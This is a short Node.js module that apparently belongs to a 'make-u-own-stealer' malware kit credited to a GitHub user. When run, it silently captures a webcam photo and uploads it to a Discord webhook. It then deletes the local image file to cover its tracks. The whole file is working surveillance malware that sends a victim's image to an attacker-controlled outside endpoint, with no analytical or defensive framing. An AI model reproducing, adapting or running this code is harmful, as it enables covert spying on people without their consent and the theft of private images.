// github.com/lawxsz

const NodeWebcam = require("node-webcam");
const FormData = require("form-data");
const fetch = require("node-fetch");
const fs = require("fs");

const hookUrl = 'https://discord.com/api/webhooks/';

const webcamOptions = {
    width: 1280,
    height: 720,
    quality: 100,
    saveShots: true,
    output: "png",
    callbackReturn: "location",
    verbose: false
};

const webcam = NodeWebcam.create(webcamOptions);

function captureImage() {
    return new Promise((resolve, reject) => {
        webcam.capture("webcamImage", function(err, data) {
            if (err) reject(err);
            else resolve(data);
        });
    });
}

async function sendToDiscord(imagePath) {
    const form = new FormData();
    form.append('file', fs.createReadStream(imagePath), { filename: "webcamImage.png" });
    form.append('payload_json', JSON.stringify({
        content: "Here is the latest webcam screenshot captured.",
        embeds: [{
            title: "Webcam Update",
            description: "The image has been attached below.",
            color: 242424,
            author: {
                name: "github.com/lawxsz/make-u-own-stealer",
                icon_url: "https://i.imgur.com/NYWdLg6.png"
            },
            footer: {
                text: "Follow on Telegram: t.me/lawxsz | GitHub: github.com/lawxsz"
            }
        }]
    }));

    const response = await fetch(hookUrl, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
    });

    if (response.ok) {
        console.log('Webcam image sent to Discord webhook.');
        fs.unlink(imagePath, (err) => {
            if (err) {
                console.error('Error deleting the image:', err);
            } else {
                console.log('Image deleted successfully.');
            }
        });
    } else {
        console.error('Error sending webcam image:', response.statusText);
    }
}

async function main() {
    try {
        const imagePath = await captureImage();
        await sendToDiscord(imagePath);
    } catch (error) {
        console.error("Error in main function:", error);
    }
}

main();
